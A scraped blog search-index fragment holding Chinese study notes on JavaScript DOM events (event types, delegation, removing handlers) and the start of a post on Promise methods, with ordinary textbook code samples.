&lt;p&gt;&lt;strong&gt;只有在事件处理程序执行期间，event 对象才会存在；一旦事件处理程序执行完 成，event 对象就会被销毁。&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;事件类型&#34;&gt;事件类型&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;UI（User Interface，用户界面）事件，当用户与页面上的元素交互时触发&lt;/li&gt;
&lt;li&gt;焦点事件，当元素获得或失去焦点时触发&lt;/li&gt;
&lt;li&gt;鼠标事件，当用户通过鼠标在页面上执行操作时触发&lt;/li&gt;
&lt;li&gt;滚轮事件，当使用鼠标滚轮（或类似设备）时触发&lt;/li&gt;
&lt;li&gt;文本事件，当在文档中输入文本时触发&lt;/li&gt;
&lt;li&gt;键盘事件，当用户通过键盘在页面上执行操作时触发&lt;/li&gt;
&lt;li&gt;合成事件，当为 IME（Input Method Editor，输入法编辑器）输入字符时触发&lt;/li&gt;
&lt;li&gt;变动（mutation）事件，当底层 DOM 结构发生变化时触发&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;ui事件&#34;&gt;UI事件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;load&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当页面完全加载后在 window 上面触发&lt;/p&gt;
&lt;p&gt;当所有框架都加载完毕时在框架集上面触发&lt;/p&gt;
&lt;p&gt;当图像加载完毕时在&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;元素上面触发&lt;/p&gt;
&lt;p&gt;当嵌入的内容加载完毕时在元素上面 触发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;unload&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当页面完全卸载后在 window 上面触发&lt;/p&gt;
&lt;p&gt;当所有框架都卸载后在框架集上面触发&lt;/p&gt;
&lt;p&gt;当嵌入的内容卸载完毕后在元素上面触发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;abort&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在用户停止下载过程时，如果嵌入的内容没有加载完，则在元素上面触发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;error&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当发生 JavaScript 错误时在 window 上面触发&lt;/p&gt;
&lt;p&gt;当无法加载图像时在&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;元素上面触 发&lt;/p&gt;
&lt;p&gt;当无法加载嵌入内容时在元素上面触发&lt;/p&gt;
&lt;p&gt;或者当有一或多个框架无法加载时在框 架集上面触发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;select&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当用户选择文本框（&lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;或&lt;code&gt;&amp;lt;texterea&amp;gt;&lt;/code&gt;）中的一或多个字符时触发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;resize&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当窗口或框架的大小变化时在 window 或框架上面触发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;scroll&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当用户滚动带滚动条的元素中的内容时，在该元素上面触发。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h4 id=&#34;load-事件&#34;&gt;load 事件&lt;/h4&gt;
&lt;p&gt;window上的load&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;EventUtil.addHandler(window, &amp;quot;load&amp;quot;, function(event){ 
 alert(&amp;quot;Loaded!&amp;quot;); 
}); 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;图像上的load&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var image = document.getElementById(&amp;quot;myImage&amp;quot;); 

EventUtil.addHandler(image, &amp;quot;load&amp;quot;, function(event){ 
 event = EventUtil.getEvent(event); 
 alert(EventUtil.getTarget(event).src); 
}); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;unload事件&#34;&gt;unload事件&lt;/h4&gt;
&lt;p&gt;利用这个事件最多的情况是清除引用，以避免内存泄漏&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;EventUtil.addHandler(window, &amp;quot;unload&amp;quot;, function(event){ 
 alert(&amp;quot;Unloaded&amp;quot;); 
}); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;resize-事件&#34;&gt;resize 事件&lt;/h4&gt;
&lt;p&gt;当浏览器窗口被调整到一个新的高度或宽度时，就会触发 resize 事件&lt;/p&gt;
&lt;p&gt;这个事件在 window（窗 口）上面触发&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;EventUtil.addHandler(window, &amp;quot;resize&amp;quot;, function(event){ 
 alert(&amp;quot;Resized&amp;quot;); 
}); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;scroll-事件&#34;&gt;scroll 事件&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;EventUtil.addHandler(window, &amp;quot;scroll&amp;quot;, function(event){ 
 if (document.compatMode == &amp;quot;CSS1Compat&amp;quot;){ 
 alert(document.documentElement.scrollTop); 
 } else { 
 alert(document.body.scrollTop); 
 } 
});
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;焦点事件&#34;&gt;焦点事件&lt;/h4&gt;
&lt;p&gt;焦点事件会在页面元素获得或失去焦点时触发。利用这些事件并与 document.hasFocus()方法及 document.activeElement 属性配合&lt;/p&gt;
&lt;p&gt;有以下 6 个焦点事件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;blur：在元素失去焦点时触发。这个事件不会冒泡&lt;/li&gt;
&lt;li&gt;focus：在元素获得焦点时触发。这个事件不会冒泡&lt;/li&gt;
&lt;li&gt;focusin：在元素获得焦点时触发，但它冒泡&lt;/li&gt;
&lt;li&gt;focusout：在元素失去焦点时触发，但它冒泡&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h4 id=&#34;鼠标与滚轮事件&#34;&gt;鼠标与滚轮事件&lt;/h4&gt;
&lt;p&gt;DOM3 级事件中定 义了 9 个鼠标事件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;click：在用户单击主鼠标按钮（一般是左边的按钮）或者按下回车键时触发。&lt;/li&gt;
&lt;li&gt;dblclick：在用户双击主鼠标按钮（一般是左边的按钮）时触发。&lt;/li&gt;
&lt;li&gt;mousedown：在用户按下了任意鼠标按钮时触发。不能通过键盘触发这个事件。&lt;/li&gt;
&lt;li&gt;mouseenter：在鼠标光标从元素外部首次移动到元素范围之内时触发。这个事件不冒泡，而且 在光标移动到后代元素上不会触发。&lt;/li&gt;
&lt;li&gt;mouseleave：在位于元素上方的鼠标光标移动到元素范围之外时触发。这个事件不冒泡，而且 在光标移动到后代元素上不会触发。&lt;/li&gt;
&lt;li&gt;mousemove：当鼠标指针在元素内部移动时重复地触发。不能通过键盘触发这个事件。&lt;/li&gt;
&lt;li&gt;mouseout：在鼠标指针位于一个元素上方，然后用户将其移入另一个元素时触发。&lt;/li&gt;
&lt;li&gt;mouseover：在鼠标指针位于一个元素外部，然后用户将其首次移入另一个元素边界之内时触 发。不能通过键盘触发这个事件。&lt;/li&gt;
&lt;li&gt;mouseup：在用户释放鼠标按钮时触发。不能通过键盘触发这个事件。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;除了 mouseenter 和 mouseleave，所有鼠标事件都会冒泡&lt;/p&gt;
&lt;p&gt;只有在同一个元素上相继触发 mousedown 和 mouseup 事件，才会触发 click 事件；如果 mousedown 或 mouseup 中的一个被取消，就不会触发 click 事件。&lt;/p&gt;
&lt;p&gt;(也就解释为什么网页按钮点击下去但不松开，移到别的地方松开不触发事件了 )&lt;/p&gt;
&lt;p&gt;如果有代码阻止了连续两次触发 click 事件，那么就不会触发 dblclick 事件了。&lt;/p&gt;
&lt;p&gt;这 4 个事件触发的顺序始终如下&lt;/p&gt;
&lt;p&gt;(1) mousedown&lt;/p&gt;
&lt;p&gt;(2) mouseup&lt;/p&gt;
&lt;p&gt;(3) click&lt;/p&gt;
&lt;p&gt;(4) mousedown&lt;/p&gt;
&lt;p&gt;(5) mouseup&lt;/p&gt;
&lt;p&gt;(6) click&lt;/p&gt;
&lt;p&gt;(7) dblclick&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;mousewheel&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当用 户通过鼠标滚轮与页面交互、在垂直方向上滚动页面时（无论向上还是向下），就会触发 mousewheel 事件。这个事件可以在任何元素上面触发，最终会冒泡到 document或 window&lt;/p&gt;
&lt;p&gt;与 mousewheel 事件对应的 event 对象除包含鼠标事件的所有标准信息外， 还包含一个特殊的 wheelDelta 属性。&lt;/p&gt;
&lt;p&gt;当用户向前滚动鼠标滚轮时，wheelDelta 是 120 的倍数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;EventUtil.addHandler(document, &amp;quot;mousewheel&amp;quot;, function(event){ 
 event = EventUtil.getEvent(event); 
 alert(event.wheelDelta); 
}); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;键盘与文本事件&#34;&gt;键盘与文本事件&lt;/h4&gt;
&lt;p&gt;有 3 个键盘事件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;keydown：当用户按下键盘上的任意键时触发，而且如果按住不放的话，会重复触发此事件。&lt;/li&gt;
&lt;li&gt;keypress：当用户按下键盘上的字符键时触发，而且如果按住不放的话，会重复触发此事件。&lt;/li&gt;
&lt;li&gt;keyup：当用户释放键盘上的键时触发。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在文本插入文本框之前会触发 &lt;code&gt;textInput&lt;/code&gt;事件。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;textInput&lt;/code&gt;当用户在可编辑区域中 输入字符时，就会触发这个事件&lt;/p&gt;
&lt;p&gt;这个用于替代 keypress 的 textInput 事件的行为稍有不同。&lt;/p&gt;
&lt;p&gt;区别 之一就是任何可以获得焦点的元素都可以触发 keypress 事件，但只有可编辑区域才能触发 textInput 事件。&lt;/p&gt;
&lt;p&gt;区别之二是 textInput 事件只会在用户按下能够输入实际字符的键时才会被触发，而 keypress 事件则在按下那些能够影响文本显示的键时也会触发（例如退格键）&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;在用户按了一下键盘上的字符键时，首先会触发 keydown 事件，然后紧跟着是 keypress 事件， 最后会触发 keyup 事件。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var textbox = document.getElementById(&amp;quot;myText&amp;quot;); 

EventUtil.addHandler(textbox, &amp;quot;keyup&amp;quot;, function(event){ 
 event = EventUtil.getEvent(event); 
 alert(event.keyCode); 
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过keyCode来判断键码&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;事件委托&#34;&gt;事件委托&lt;/h2&gt;
&lt;p&gt;事件委托利用了事件冒泡，只指定一个事 件处理程序，就可以管理某一类型的所有事件&lt;/p&gt;
&lt;p&gt;例如，click 事件会一直冒泡到 document 层次。也就 是说，我们可以为整个页面指定一个 onclick 事件处理程序&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;ul id=&amp;quot;myLinks&amp;quot;&amp;gt; 
 &amp;lt;li id=&amp;quot;goSomewhere&amp;quot;&amp;gt;Go somewhere&amp;lt;/li&amp;gt; 
 &amp;lt;li id=&amp;quot;doSomething&amp;quot;&amp;gt;Do something&amp;lt;/li&amp;gt; 
 &amp;lt;li id=&amp;quot;sayHi&amp;quot;&amp;gt;Say hi&amp;lt;/li&amp;gt; 
&amp;lt;/ul&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;包含 3 个被单击后会执行操作的列表项，按照传统的做法，需要像下面这样为它们添加 3 个事 件处理程序。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var item1 = document.getElementById(&amp;quot;goSomewhere&amp;quot;); 
var item2 = document.getElementById(&amp;quot;doSomething&amp;quot;); 
var item3 = document.getElementById(&amp;quot;sayHi&amp;quot;); 

EventUtil.addHandler(item1, &amp;quot;click&amp;quot;, function(event){ 
 location.href = &amp;quot;http://www.wrox.com&amp;quot;; 
}); 

EventUtil.addHandler(item2, &amp;quot;click&amp;quot;, function(event){ 
 document.title = &amp;quot;I changed the document&#39;s title&amp;quot;; 
});

EventUtil.addHandler(item3, &amp;quot;click&amp;quot;, function(event){ 
 alert(&amp;quot;hi&amp;quot;); 
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时，可以利用事件委托技术解决这个问题。使用事件委托，只需在 DOM 树中尽量最高的层次上添加一个事件处理程序&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var list = document.getElementById(&amp;quot;myLinks&amp;quot;); 

list.addEventListener(&amp;quot;click&amp;quot;, function(event){ 
    
let target =event.target

 switch(target.id){ 
 case &amp;quot;doSomething&amp;quot;: 
 document.title = &amp;quot;I changed the document&#39;s title&amp;quot;; 
 break; 
         
 case &amp;quot;goSomewhere&amp;quot;: 
 location.href = &amp;quot;http://www.wrox.com&amp;quot;; 
 break; 
         
 case &amp;quot;sayHi&amp;quot;: 
 alert(&amp;quot;hi&amp;quot;); 
 break; 
         
 } 
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们使用事件委托只为&lt;code&gt;&amp;lt;ul&amp;gt;&lt;/code&gt;元素添加了一个 onclick 事件处理程序。&lt;/p&gt;
&lt;p&gt;由于所有列 表项都是这个元素的子节点，而且它们的事件会冒泡，所以单击事件最终会被这个函数处理。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;移除事件处理程序&#34;&gt;移除事件处理程序&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;div id=&amp;quot;myDiv&amp;quot;&amp;gt; 
 &amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Click Me&amp;quot; id=&amp;quot;myBtn&amp;quot;&amp;gt; 
&amp;lt;/div&amp;gt; 

&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; 
    
 var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
 btn.onclick = function(){ 
 //先执行某些操作
 document.getElementById(&amp;quot;myDiv&amp;quot;).innerHTML = &amp;quot;Processing...&amp;quot;; //麻烦了！
 }; 

&amp;lt;/script&amp;gt; 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在元素上设置 innerHTML 可以把按钮移走，但事件处理程序仍然与按钮保持 着引用关系，在这种情况下不会作出恰当地处理，它们很有可能会将对元素和 对事件处理程序的引用都保存在内存中。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;正确操作&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;div id=&amp;quot;myDiv&amp;quot;&amp;gt; 
 &amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Click Me&amp;quot; id=&amp;quot;myBtn&amp;quot;&amp;gt; 
&amp;lt;/div&amp;gt; 

&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; 
 var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
 btn.onclick = function(){ 
     
 //先执行某些操作
 btn.onclick = null; //移除事件处理程序
     
 document.getElementById(&amp;quot;myDiv&amp;quot;).innerHTML = &amp;quot;Processing...&amp;quot;; 
 }; 
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;&#34;&gt;&lt;/h2&gt;
">JS的事件</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/promise-dui-xiang/"" data-c="
          &lt;h2 id=&#34;定义&#34;&gt;定义&lt;/h2&gt;
&lt;p&gt;Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Promise&lt;/code&gt;对象有以下两个特点。&lt;/p&gt;
&lt;p&gt;（1）对象的状态不受外界影响。&lt;code&gt;Promise&lt;/code&gt;对象代表一个异步操作，有三种状态：&lt;code&gt;pending&lt;/code&gt;（进行中）、&lt;code&gt;fulfilled&lt;/code&gt;（已成功）和&lt;code&gt;rejected&lt;/code&gt;（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。&lt;/p&gt;
&lt;p&gt;（2）一旦状态改变，就不会再变，任何时候都可以得到这个结果。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;Promise&lt;/code&gt;也有一些缺点&lt;/p&gt;
&lt;p&gt;首先，无法取消&lt;code&gt;Promise&lt;/code&gt;，一旦新建它就会立即执行，无法中途取消。&lt;/p&gt;
&lt;p&gt;其次，如果不设置回调函数，&lt;code&gt;Promise&lt;/code&gt;内部抛出的错误，不会反应到外部&lt;/p&gt;
&lt;p&gt;第三，当处于&lt;code&gt;pending&lt;/code&gt;状态时，无法得知目前进展到哪一个阶段&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;基本用法&#34;&gt;基本用法&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Promise&lt;/code&gt;对象是一个构造函数，用来生成&lt;code&gt;Promise&lt;/code&gt;实例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const promise = new Promise(function(resolve, reject) {
  // ... some code

  if (/* 异步操作成功 */){
    resolve(value);
  } else {
    reject(error);
  }
});
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;Promise&lt;/code&gt;对象实现的 Ajax 操作&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const getJSON = function(url) {
  const promise = new Promise(function(resolve, reject){
    const handler = function() {
      if (this.readyState !== 4) {
        return;
      }
      if (this.status === 200) {
        resolve(this.response);
      } else {
        reject(new Error(this.statusText));
      }
    };
    const client = new XMLHttpRequest();
    client.open(&amp;quot;GET&amp;quot;, url);
    client.onreadystatechange = handler;
    client.responseType = &amp;quot;json&amp;quot;;
    client.setRequestHeader(&amp;quot;Accept&amp;quot;, &amp;quot;application/json&amp;quot;);
    client.send();

  });

  return promise;
};

getJSON(&amp;quot;/posts.json&amp;quot;).then(function(json) {
  console.log(&#39;Contents: &#39; + json);
}, function(error) {
  console.error(&#39;出错了&#39;, error);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;Promise 的使命就完成了，后继操作应该放到&lt;code&gt;then&lt;/code&gt;方法里面，而不应该直接写在&lt;code&gt;resolve&lt;/code&gt;或&lt;code&gt;reject&lt;/code&gt;的后面。所以，最好在它们前面加上&lt;code&gt;return&lt;/code&gt;语句，这样就不会有意外。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;new Promise((resolve, reject) =&amp;gt; {
  return resolve(1);
  // 后面的语句不会执行
  console.log(2);
})
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseprototypethen&#34;&gt;&lt;code&gt;Promise.prototype.then()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;then&lt;/code&gt;的作用是为 Promise 实例添加状态改变时的回调函数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;then&lt;/code&gt;方法返回的是一个新的&lt;code&gt;Promise&lt;/code&gt;实例（注意，不是原来那个&lt;code&gt;Promise&lt;/code&gt;实例）。因此可以采用链式写法，即&lt;code&gt;then&lt;/code&gt;方法后面再调用另一个&lt;code&gt;then&lt;/code&gt;方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;getJSON(&amp;quot;/posts.json&amp;quot;).then(function(json) {
  return json.post;
}).then(function(post) {
  // ...
});
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseprototypecatch&#34;&gt;&lt;code&gt;Promise.prototype.catch()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;用于指定发生错误时的回调函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const promise = new Promise(function(resolve, reject) {
  throw new Error(&#39;test&#39;);
});
promise.catch(function(error) {
  console.log(error);
});
// Error: test
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个&lt;code&gt;catch&lt;/code&gt;语句捕获。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;getJSON(&#39;/post/1.json&#39;).then(function(post) {
  return getJSON(post.commentURL);
}).then(function(comments) {
  // some code
}).catch(function(error) {
  // 处理前面三个Promise产生的错误
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一共有三个 Promise 对象：一个由&lt;code&gt;getJSON()&lt;/code&gt;产生，两个由&lt;code&gt;then()&lt;/code&gt;产生。它们之中任何一个抛出的错误，都会被最后一个&lt;code&gt;catch()&lt;/code&gt;捕获。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;不要在&lt;code&gt;then()&lt;/code&gt;方法里面定义 Reject 状态的回调函数（即&lt;code&gt;then&lt;/code&gt;的第二个参数），总是使用&lt;code&gt;catch&lt;/code&gt;方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// bad
promise
  .then(function(data) {
    // success
  }, function(err) {
    // error
  });

// good
promise
  .then(function(data) { //cb
    // success
  })
  .catch(function(err) {
    // error
  });
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第二种写法要好于第一种写法，理由是第二种写法可以捕获前面&lt;code&gt;then&lt;/code&gt;方法执行中的错误，也更接近同步的写法（&lt;code&gt;try/catch&lt;/code&gt;）。因此，建议总是使用&lt;code&gt;catch()&lt;/code&gt;方法，而不使用&lt;code&gt;then()&lt;/code&gt;方法的第二个参数。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;跟传统的&lt;code&gt;try/catch&lt;/code&gt;代码块不同的是，如果没有使用&lt;code&gt;catch()&lt;/code&gt;方法指定错误处理的回调函数，Promise 对象抛出的错误不会传递到外层代码，即不会有任何反应。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const someAsyncThing = function() {
  return new Promise(function(resolve, reject) {
    // 下面一行会报错，因为x没有声明
    resolve(x + 2);
  });
};

someAsyncThing().then(function() {
  console.log(&#39;everything is great&#39;);
});

setTimeout(() =&amp;gt; { console.log(123) }, 2000);
// Uncaught (in promise) ReferenceError: x is not defined
// 123
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Promise 对象内部有语法错误，但是不会退出进程、终止脚本执行，2 秒之后还是会输出&lt;code&gt;123&lt;/code&gt;。这就是说，Promise 内部的错误不会影响到 Promise 外部的代码，通俗的说法就是“Promise 会吃掉错误”&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseprototypefinally&#34;&gt;&lt;code&gt;Promise.prototype.finally()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;finally()&lt;/code&gt;方法用于指定不管 Promise 对象最后状态如何，都会执行的操作&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;promise
.then(result =&amp;gt; {···})
.catch(error =&amp;gt; {···})
.finally(() =&amp;gt; {···});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;finally&lt;/code&gt;方法的回调函数不接受任何参数&lt;/strong&gt;，这意味着没有办法知道，前面的 Promise 状态到底是&lt;code&gt;fulfilled&lt;/code&gt;还是&lt;code&gt;rejected&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;finally&lt;/code&gt;方法里面的操作，应该是与状态无关的，不依赖于 Promise 的执行结果。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;finally&lt;/code&gt;本质上是&lt;code&gt;then&lt;/code&gt;方法的特例。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;promise
.finally(() =&amp;gt; {
  // 语句
});

// 等同于
promise
.then(
  result =&amp;gt; {
    // 语句
    return result;
  },
  error =&amp;gt; {
    // 语句
    throw error;
  }
);
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseall&#34;&gt;&lt;code&gt;Promise.all()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Promise.all()&lt;/code&gt;方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const p = Promise.all([p1, p2, p3]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Promise.all()&lt;/code&gt;方法接受一个数组作为参数，&lt;code&gt;p1&lt;/code&gt;、&lt;code&gt;p2&lt;/code&gt;、&lt;code&gt;p3&lt;/code&gt;都是 Promise 实例，如果不是，就会先调用下面讲到的&lt;code&gt;Promise.resolve&lt;/code&gt;方法，将参数转为 Promise 实例，再进一步处理&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Promise.all()&lt;/code&gt;方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;p&lt;/code&gt;的状态由&lt;code&gt;p1&lt;/code&gt;、&lt;code&gt;p2&lt;/code&gt;、&lt;code&gt;p3&lt;/code&gt;决定，分成两种情况。&lt;/p&gt;
&lt;p&gt;（1）只有&lt;code&gt;p1&lt;/code&gt;、&lt;code&gt;p2&lt;/code&gt;、&lt;code&gt;p3&lt;/code&gt;的状态都变成&lt;code&gt;fulfilled&lt;/code&gt;，&lt;code&gt;p&lt;/code&gt;的状态才会变成&lt;code&gt;fulfilled&lt;/code&gt;，此时&lt;code&gt;p1&lt;/code&gt;、&lt;code&gt;p2&lt;/code&gt;、&lt;code&gt;p3&lt;/code&gt;的返回值组成一个数组，传递给&lt;code&gt;p&lt;/code&gt;的回调函数。&lt;/p&gt;
&lt;p&gt;（2）只要&lt;code&gt;p1&lt;/code&gt;、&lt;code&gt;p2&lt;/code&gt;、&lt;code&gt;p3&lt;/code&gt;之中有一个被&lt;code&gt;rejected&lt;/code&gt;，&lt;code&gt;p&lt;/code&gt;的状态就变成&lt;code&gt;rejected&lt;/code&gt;，此时第一个被&lt;code&gt;reject&lt;/code&gt;的实例的返回值，会传递给&lt;code&gt;p&lt;/code&gt;的回调函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// 生成一个Promise对象的数组
const promises = [2, 3, 5, 7, 11, 13].map(function (id) {
  return getJSON(&#39;/post/&#39; + id + &amp;quot;.json&amp;quot;);
});

Promise.all(promises).then(function (posts) {
  // ...
}).catch(function(reason){
  // ...
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;promises&lt;/code&gt;是包含 6 个 Promise 实例的数组，只有这 6 个实例的状态都变成&lt;code&gt;fulfilled&lt;/code&gt;，或者其中有一个变为&lt;code&gt;rejected&lt;/code&gt;，才会调用&lt;code&gt;Promise.all&lt;/code&gt;方法后面的回调函数。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;如果作为参数的 Promise 实例，自己定义了&lt;code&gt;catch&lt;/code&gt;方法，那么它一旦被&lt;code&gt;rejected&lt;/code&gt;，并不会触发&lt;code&gt;Promise.all()&lt;/code&gt;的&lt;code&gt;catch&lt;/code&gt;方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const p1 = new Promise((resolve, reject) =&amp;gt; {
  resolve(&#39;hello&#39;);
})
.then(result =&amp;gt; result)
.catch(e =&amp;gt; e);

const p2 = new Promise((resolve, reject) =&amp;gt; {
  throw new Error(&#39;报错了&#39;);
})
.then(result =&amp;gt; result)
.catch(e =&amp;gt; e);

Promise.all([p1, p2])
.then(result =&amp;gt; console.log(result))
.catch(e =&amp;gt; console.log(e));
// [&amp;quot;hello&amp;quot;, Error: 报错了]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;p2&lt;/code&gt;有自己的&lt;code&gt;catch&lt;/code&gt;方法，该方法返回的是一个新的 Promise 实例，&lt;code&gt;p2&lt;/code&gt;指向的实际上是这个实例。该实例执行完&lt;code&gt;catch&lt;/code&gt;方法后，也会变成&lt;code&gt;resolved&lt;/code&gt;，导致&lt;code&gt;Promise.all()&lt;/code&gt;方法参数里面的两个实例都会&lt;code&gt;resolved&lt;/code&gt;，因此会调用&lt;code&gt;then&lt;/code&gt;方法指定的回调函数，而不会调用&lt;code&gt;catch&lt;/code&gt;方法指定的回调函数。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiserace&#34;&gt;&lt;code&gt;Promise.race()&lt;/code&gt;&lt;/h2&gt;
